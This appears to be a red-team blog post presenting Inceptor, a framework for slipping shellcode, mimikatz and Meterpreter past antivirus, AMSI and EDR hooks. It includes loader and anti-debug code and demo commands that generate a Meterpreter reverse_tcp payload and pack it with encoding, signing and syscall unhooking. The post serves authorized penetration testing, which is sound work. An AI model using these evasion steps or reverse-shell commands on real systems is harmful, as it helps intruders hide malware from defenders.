# The path to code execution in the era of EDR, Next-Gen AVs, and AMSI

## TL;DR

During red teaming engagements or regular penetration testing, I always need to bypass certain AV, EDR or other
defensive mechanisms. My usual approach was to just get rid of the signatures from a tool I need, by performing manual
modifications. However, as the reader may already know, this process is not always quick, or even feasible. 
In the middle of 2020, speaking with a colleague, I was discussing the need to design a more robust solution that could
help us to bypass a target AV or EDR without requiring too much effort. I then decided to work on a new framework,
which I later called **Inceptor**.

After a bit of work, the tool became actually decent. So decent that I decided to open a public fork of it,
to allow the community to play around with it and, hopefully, to help me improve it.

Before digging into the development process, it would be good to have a look to the slides of my talk 
"Bypass AV-EDR solutions combining well known techniques". The talk was a good summary of the techniques which 
have been later implemented within **Inceptor**.

* [Inceptor - Bypass AV-EDR solutions combining well known techniques](https://github.com/klezVirus/inceptor/blob/main/slides/Inceptor%20-%20Bypass%20AV-EDR%20solutions%20combining%20well%20known%20techniques.pdf)

## Introduction

Relatively recently, during a "singular" engagement on a particularly restricted environment, my team, and I had quite a hard time
creating a payload which could fit our needs, evading the platform defenses.
As such, I decided it was a good time to design a solution which could help us to execute arbitrary shellcode
and existing binaries without requiring us to manipulate their source-code everytime.
As our work always require adapting to a particular situation, environment, or contingency problem, building
a tool we could stick in any case without any development effort was not easy.

As I've always been in love with Python, I decided to stick with it for this task as well.

## Multi-Language Templates

First thing first, considering our usual job, what I wanted to implement was to allow any tester within the team to be able to use
her best skills to craft "her own" payloads. For this reason, I already knew I'd have to offer support for C/C++,
.NET, and maybe PowerShell artifacts.

I decided then to make Inceptor template-driven, meaning that the tool can help a tester do whatever she wants,
as long as she can implement a template to support her needs.

What is a template, exactly? A template represents a Loader. A loader is merely a "way" to load a shellcode, an EXE,
or a DLL into memory, and then execute it in-memory. The example below is an example of a simple loader:

```cs
IntPtr functionAddress = Win32.VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, (UInt32)Win32.AllocationType.Commit, (UInt32)Win32.MemoryProtection.ExecuteReadWrite);
Marshal.Copy(shellcode, 0, (IntPtr)(functionAddress), shellcode.Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
hThread = Win32.CreateThread(IntPtr.Zero, IntPtr.Zero, functionAddress, pinfo, 0, out threadId);
Win32.WaitForSingleObject(hThread, 0xFFFFFFFF);
```

## Shellcode execution and PE/DLL packing

Of course, with the term "executing arbitrary code", we also implicitly included pre-existing binaries. As
shown above, shellcode execution was pretty easy to implement but, what for existing binaries?

For pre-existing EXEs and DLLs, the solution was triple:
* The EXE is .NET? We can use `Assembly.Load`
* The EXE is not .NET, we can use the RunPE technique
* We can just convert the EXE in PIC Shellcode with Donut

Naturally, the simpler, and preferred choice was to use the fantastic tool [Donut][7], from TheWover, to convert an EXE to shellcode,
then use the shellcode in a code-injection template, as the one provided above.

In the end, I decided to also add support for direct PE loading and .NET reflective loading, but they are generally
less successful and more difficult to make undetectable.

## The template engine

The most difficult thing to do was designing the template engine. Indeed, the design is still lacking. 
The template engine, by itself, it's just a string-replacement engine, which final aim is to build a working 
Loader. However, supporting 3 different languages, I had to implement the code generator
carefully, to try minimizing or handling cases like code duplication, variable re-definitions and namespaces 
collisions, among other problems.

However, generally it was not too difficult. Any simple loader has at least 3 main parts:
* Imports
* Function declarations
* Main

Which practically appears like this in C#:

```cs
//####USING####

namespace MyNamespace
{
    //####CODE###
    
    class Program
    {
        static void Main(string[] args)
        {
            var encoded = ####SHELLCODE####;
            //####CALL####

            <SHELLCODE ALLOCATION>
            <SHELLCODE EXECUTION>
        }
    }
```

While appears like this in C:

```c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
...
//####USING####

//####DEFINE####

//####CODE####

DWORD WINAPI MainFunction(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = ####SHELLCODE####;
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //####CALL####
    
    unsigned char* decoded = encoded;
    <SHELLCODE ALLOCATION>
    <SHELLCODE EXECUTION>
}

int main(char** argv)
{
    // Other placeholders if needed
    MainFunction((LPVOID)argv);
}
```

The `USING` placeholder, as it might be easily guessed, is where the imports, needed to produce the final artifact
code, will be placed. The `CODE` placeholder, instead, is where Inceptor will add the relevant classes or functions implemented
by the modules, like encoding/decoding, argument parsing/crafting, anti-debug checks, and so on.
Last but not least, the `CALL` placeholder is where the shellcode gets decoded (if needed).

Of course, there are several more placeholders in Inceptor. Each of them has been designed with a specific purpose.
I think the whole system can be improved a lot, but I had no real time to think about it so far.

## Pluggable modules

In order to be customizable, the tool needed to be modular, permitting the tester to load only what she needs to
load for a specific task. This could mean load an AMSI bypass module, or switch from P/Invoke to D/Invoke, or using
an external DLL, or using Syscalls... etc.

In order to do that, I had to develop any module as a standalone. Any module is fully independent, meaning that the module
itself manage its own dependencies, its own libraries, etc.

Moreover, when a module requires in-line assembly or multiple sources, it's usually compiled in a static-library and 
then linked against the loader, to avoid code duplication and similar issues.

When calling a module, Inceptor will check if there is any template which is compatible with it, and fail if negative.

## Signature Evasion

The next thing was to make sure the generated shellcode was resistant against AV signatures. For this reason, 
I firstly decided to use an external tool for encoding/encrypting the shellcode, similarly to what Metasploit 
does. My choice fell on the awesome [Shikata-Ga-Nai](https://github.com/EgeBalci/sgn) implementation by [Ege Balci](https://twitter.com/egeblc). The probability space of this 
encoder is so high that it's extremely unlikely an AV signature would be able to detect the shellcode anymore.

However, I soon realized that this mechanism is only usable when injecting PIC shellcode. Any other technique,
as Reflective PE Injection, or the .NET `Assembly.Load`, requires the shellcode to be a valid PE or assembly structure,
meaning they cannot decode in-memory. 

For this reason, I decided to also provide Inceptor with encoders/decoders handled directly by the loader. This required
of course to implement the same version of each encoder in multiple languages.

To improve the probability space of all encoders, I also decided to make the encoders "chainable", meaning that
an encoder can be used in combination with others, even more than once. This way, the only way to actually produce a 
signature for a given binary is to detect the decoder stub, more than the shellcode itself.

## AMSI, WLDP, and ETW bypass

Another thing I desired to implement was a working AMSI bypass. In another [tool](https://github.com/klezVirus/CheeseTools), 
I had also studied how to patch WLDP and ETW, following the amazing posts of [odhzan](https://modexp.wordpress.com/author/odzhan/).

The anatomy of a patch is always the same, and consists of a DLL target, a function to patch (typically an address
plus an offset), and a binary patch.
So I've ended up creating a mapping with these elements, and using them to apply all the patches sequentially.

## Anti-Reversing

To solve the problem above, I also thought it was necessary to implement some tricks to make Reverse Engineers
life a bit harder. For this reason, I implemented a few simple tricks to check the presence of a debugger, mostly
taken as-is or adapted from [Mecanik](https://github.com/Mecanik/Anti-DebugNET):

```cs
// Stupidly simple
private static int CheckDebuggerPresent()
{
    if (System.Diagnostics.Debugger.IsAttached)
    {
        return 1;
    }
return 0;
}

//Still simple but less stupid
private static int CheckDebugPort()
{
    NtStatus status;
    IntPtr DebugPort = new IntPtr(0);
    int ReturnLength;

    unsafe
    {
        status = NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, PROCESSINFOCLASS.ProcessDebugPort, out DebugPort, Marshal.SizeOf(DebugPort), out ReturnLength);

        if (status == NtStatus.Success)
        {
            if (DebugPort == new IntPtr(-1))
            {
                Console.WriteLine("DebugPort : {0:X}", DebugPort);
                return 1;
            }
        }
    }

    return 0;
}
```

## Code-Obfuscation

To make RE life even more difficult, I've also provided Inceptor with the capability to obfuscate artifacts code.
With the sole exception of PowerShell, which uses code-based obfuscation with [Chameleon][2], Inceptor uses IR-based (Intermediate-Representation)
obfuscation. To support that, I integrated the [ConfuserEx][4], [AsStrongAsFuck][5] and [LoGIC.NET][10].

These obfuscation engines, especially ConfuserEx, are really powerful. However, they're heavily used within C#
malware development and AV vendors have started detecting their usage, so their effectiveness is lowering over
time. The next step for this kind of artifacts will be building a code-based obfuscator for C#.

Last but not least, I wanted to support native code obfuscation. When I started building inceptor, I had no clear 
idea about how to do it. After a bit of research, I found out the LLVM-Obfuscator project, and I also discovered 
how it had been successfully used in [PEzor](https://github.com/phra/PEzor), by my fellow-countryman [Francesco Soncina](https://twitter.com/phraaaaaaa),
as a native code obfuscator. However, nothing were suggesting LLVM supported Windows, and I didn't want to involve
Cygwin or WSL to develop Inceptor. In the end, I figured out how to compile LLVM-Obfuscator on Windows, and I
created a personal branch of [LLVM-Obfuscator][3], with the instructions to compile on Windows and a binary release. 

## Code-Signing

It's well-known that signed binary are put under less scrutiny than non-signed binary. 
At this point, I thought it was also safer to implement a code-signing mechanism. My choice was to adapt the already 
existing [CarbonCopy][6] to achieve the task, minimizing the effort.

## EDR Evasion

A lot has been told around EDR evasion. The techniques I used the most so far have always been unhooking, manual mapping,
and direct syscalls. I implemented them within Inceptor as pluggable modules, using two incredible projects:

* [Syswhispers][8], which can be used to create valid syscalls stubs to be used in C/C++ templates
* [D/Invoke][9], which can be used to create C# templates using manual mapping or Syscalls

The public version of inceptor has at least a template per scenario, to provide any user with a practical
example of how a template should be designed. 

## DEMO 1: AV Bypass (Executing Mimikatz)

For this demo, we will use the `CLASSIC` template, which uses simple Windows API `VirtualAlloc` to allocate the shellcode
and `CreateThread` to execute it. In order to bypass all AV controls, we'll encode our shellcode using Shikata-Ga-Nai, 
we'll embed an AMSI bypass (to defeat AMSI), and an execution delay (to defeat behavioural analysis):

```
# We have to specify Donut as the loader otherwise Pe2Shellcode will be used as default
python inceptor.py dotnet -t donut mimikatz.exe -o kiwi.exe --sgn --sign --delay 120 
```

<div class="embed-container">
  <iframe
      style="display: block;margin-left: auto;margin-right: auto;"
      width="800"
      height="600"
      src="https://drive.google.com/file/d/1fCeWCUSuB22qbMpKmCB6GaeKMBnA1kOR/preview"
      frameborder="0"
      allow="autoplay"
      allowfullscreen="">
  </iframe>
</div>

## DEMO 2: Userland Hooking Bypass (Executing Meterpeter)

To run this simple demo, we will make use of the popular tool `frida-trace`. This demo will serve as a PoC
to show what's userland hooking is about, and how we can effectively bypass it via manual mapping and Syscalls.

NW: To run the demo as below, it's necessary to download the files `demo.bat` and `demo.ps1` from Inceptor 
repository. Frida will install a hook on `NtCreateThreadEx`, and Inceptor will try to bypass it using raw syscalls.

### Demo 2.1: we get caught!

```
# Console 1: Start Metasploit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f raw -o msf.raw
handler -H eth0 -P 4444 -p windows/x64/meterpreter/reverse_tcp

# Console 2: Pack the shellcode
# --sgn: encode the shellcode
# --sign: sign the loader
# -P: uses process injection
# --delay 15: Wait for 15 seconds to allow frida to install the hooks!
python inceptor.py dotnet msf.raw -o MySisterFell.exe --sgn --sign -P --delay 15

# Console 3: Start the demo!
demo.bat MySisterFell.exe
```

The result should be similar to the following, showing that Frida could intercept the call to 
NtCreateThreadEx performed by the loader:

![We Got Caught!](./assets/We_Got_Caught.png)

### Demo 2.2: Ok, now with manual mapping!

```
# Console 1: Start Metasploit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f raw -o msf.raw
handler -H eth0 -P 4444 -p windows/x64/meterpreter/reverse_tcp

# Console 2: Pack the shellcode
# --sgn: encode the shellcode
# --sign: sign the loader
# -m dinvoke: to load the D/Invoke module
# -P: uses process injection
# --delay 15: Wait for 15 seconds to allow frida to install the hooks!
python inceptor.py dotnet msf.raw -o MySisterFell.exe --sgn --sign -P -m dinvoke --delay 15

# Console 3: Start the demo!
demo.bat MySisterFell.exe
```
The result should be similar to the following, showing the Inceptor loader successfully bypassed Frida:

![We Bypassed It!](./assets/We_Bypassed_It.png)

The full video below:

<div class="embed-container">
  <iframe
      style="display: block;margin-left: auto;margin-right: auto;"
      width="800"
      height="600"
      src="https://drive.google.com/file/d/1uqxqW9ww8QtPs5Ga3WRj9lhQN68OE8Up/preview"
      frameborder="0"
      allow="autoplay"
      allowfullscreen="">
  </iframe>
</div>

## Keynotes

As easily observable, I've only talked about the .NET component of Inceptor. The reason is I find .NET code to
be intrinsically more difficult to obfuscate and run than native code. The clear advantage of .NET binaries is that
they can be loaded reflectively (i.e. within a C2). However, as C# code is easily reversible to IL code, these binaries 
are easier to analyse and ultimately, it's easier to create signature for them.

## Similar work on the topic

Before the end of the post, I would like to introduce similar tools around the same topics of AV/EDR Evasion and PE 
packing. Before working on Inceptor, I didn't have much knowledge about other similar open-source solutions. 
However, while I was doing my research about it, I've come across two of them, and I couldn't possibly miss referencing 
such amazing tools.

* [PEzor](https://github.com/phra/PEzor): PEzor is an open-source PE packer designed to work on Kali Linux by Francesco 
  Soncina ([@phraaaaaaa](https://twitter.com/phraaaaaaa)).
* [Artifacts-Kit](https://github.com/forrest-orr/artifacts-kit): Artifatcts-Kit is a Malicious Memory Artifact Generator 
  by Forrest Orr ([@_ForrestOrr](https://twitter.com/_ForrestOrr)).

PEzor, in particular, offers a set of features which overlaps with Inceptor, making them respectively the Linux and Windows 
solution to "evasive" PE packing. They key differences between PEzor and Inceptor are:

* Inceptor is template-driven, meaning it's being designed to let the user write his own templates easily
* Built-In AMSI, WLDP, and ETW in-memory patching, which can be used as a boilerplate for further development
* Slightly broader set of features: .NET obfuscation, .NET anti-debug, loader signing.. etc
* Full support for D/Invoke and Syswhisper (1-2)
* Support for PowerShell artifacts (with built-in AMSI bypass and code obfuscation)

**Disclaimer**: Please note these are just differences. The aim of this project was to create a framework
to allow users to craft their own artifacts by templates written in C/C++, C# or PowerShell. 
PEzor, instead, is a full-fledged PE packer that works just great, and was designed to support several pre-defined
techniques and output formats. It can still bypass Defender and other EDR after years of public exposure, 
which is freaking amazing. If this wasn't enough, PEzor has also capabilities Inceptor doesn't. 
As example, it supports BOF format, which is something Inceptor doesn't support at the moment.
I really recommend checking it out.

However, even if it is great, PEzor implements conditional compilation by using compiler directives, which are a bit 
more difficult for a user to mess with than the templates Inceptor offers. 

## Timeline

- February/March 2021: D/Invoke DLL is caught by Defender when added via NuGet
- March 2021: D/Invoke is caught by Defender even if merged via ILMerge
- May 2021: Basic .NET encoders are failing to bypass defender efficiently, due to the key being hardcoded 
  in the loader
- May 2021: AsStrongAsFuck obfuscator is drastically lowering the success rate against Defender
- June 2021: The public version of the `PE_LOAD` template is now very difficult to run, even if obfuscated
- July 2021: The new D/Invoke version of `PE_LOAD` seems to work
- August 2021: Releasing the tool to the public

## Conclusion

This framework was amazingly fun to implement. As far as I'm concerned, there is still plenty of work to do, and 
I'm constantly upgrading both the private and the public branch. I hope I'll receive some PR!

## Credits

Without these amazing people sharing their knowledge, I would probably be still cooking without fire.
They're amazing, and their passion helped and keep helping people growing their knowledge. Thanks!

* [Odhzan](https://modexp.wordpress.com/author/odzhan/)
* [TheWover](https://twitter.com/TheRealWover)
* [Jean Maes](https://twitter.com/Jean_Maes_1994)
* [spotheplanet](https://twitter.com/spotheplanet)
* [xpn](https://twitter.com/_xpn_)
* [RastaMouse](https://twitter.com/_RastaMouse)
* [S3cur3Th1sSh1t](https://twitter.com/ShitSecure)
* [hasherezade](https://twitter.com/hasherezade)
* [monoxgas](https://twitter.com/monoxgas)
* [modexp](https://twitter.com/modexpblog)
* [phraaaaaaa](https://twitter.com/phraaaaaaa)

[Back to Red Teaming](../../)

[Back to Home](https://klezvirus.github.io/)


[1]: https://github.com/klezVirus/inceptor.git
[2]: https://github.com/klezVirus/chameleon.git
[3]: https://github.com/klezVirus/obfuscator/tree/llvm-9.0.1
[4]: https://github.com/mkaring/ConfuserEx
[5]: https://github.com/Charterino/AsStrongAsFuck
[6]: https://github.com/paranoidninja/CarbonCopy
[7]: https://github.com/TheWover/donut 
[8]: https://github.com/jthuraisamy/SysWhispers2
[9]: https://github.com/TheWover/DInvoke
[10]: https://github.com/AnErrupTion/LoGiC.NET
